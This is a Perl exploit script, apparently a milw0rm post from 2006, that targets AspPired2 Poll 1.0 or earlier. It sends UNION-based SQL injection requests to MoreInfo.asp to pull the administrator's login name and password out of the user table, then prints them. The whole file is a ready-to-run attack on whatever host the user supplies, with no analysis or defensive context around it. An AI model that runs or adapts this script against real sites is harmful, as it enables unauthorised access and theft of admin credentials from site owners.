#!/usr/bin/perl
#[Script Name: AspPired2 Poll <= 1.0 (MoreInfo.asp) Remote SQL Injection Exploit
#[Coded by   : ajann
#[Author     : ajann
#[Contact    : :(

use IO::Socket;
if(@ARGV < 3){
print "
[========================================================================
[//  AspPired2 Poll <= 1.0 (MoreInfo.asp) Remote SQL Injection Exploit
[//           Usage: class.pl [target] [path] [userid]
[//                   Example: exploit.pl victim.com / 1
[//                   Example: exploit.pl victim.com /path/ 1
[//                           Vuln&Exp : ajann
[========================================================================
";
exit();
}
#Local variables
$server = $ARGV[0];
$server =~ s/(http:\/\/)//eg;
$host = "http://".$server;
$port = "80";
$dir = $ARGV[1];
$file = "MoreInfo.asp?id=";
$target = "-1+union+select+login+from+user+where+no+like%20".$ARGV[2];
$target = $host.$dir.$file.$target;

$targettwo = "-1+union+select+password+from+user+where+no+like%20".$ARGV[2];
$targettwo = $host.$dir.$file.$targettwo;



#Writing data to socket
print "+**********************************************************************+\n";
print "+ Trying to connect: $server\n";
$socket = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$server", PeerPort => "$port") || die "\n+ Connection failed...\n";
print $socket "GET $target\n";
print $socket "Host: $server\n";
print $socket "Accept: */*\n";
print $socket "Connection: close\n\n";
print "+ Connected!...\n";
#Getting
while($answer = <$socket>) {
if ($answer =~ /ltext\">(.*?)<\/td>/){ 
print "+ Exploit succeed! Getting admin information.\n";
print "+ ---------------- +\n";
print "+ Username: $1\n";

print "+**********************************************************************+\n";
print "+ Trying to connect for Password: $server\n";
$socket1 = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$server", PeerPort => "$port") || die "\n+ Connection failed...\n";
print $socket1 "GET $targettwo\n";
print $socket1 "Host: $server\n";
print $socket1 "Accept: */*\n";
print $socket1 "Connection: close\n\n";
print "+ Connected!...\n";
#Getting
while($answer = <$socket1>) {
if ($answer =~ /ltext\">(.*?)<\/td>/){ 
print "+ Exploit succeed! Getting admin information.\n";
print "+ ---------------- +\n";
print "+ Password: $1\n";
print "+**********************************************************************+\n";
exit();
}


if ($answer =~ /Ad removed or not yet approved/) { 
print "+ Exploit Failed : ( \n";
print "+**********************************************************************+\n";
exit(); 
}

if ($answer =~ /Internal Server Error/) {
print "+ Exploit Failed : (  \n";
print "+**********************************************************************+\n";
exit(); 
}
 }
   } 
    }
print "+ Exploit failed :(\n";
print "+**********************************************************************+\n";

# milw0rm.com [2006-11-09]
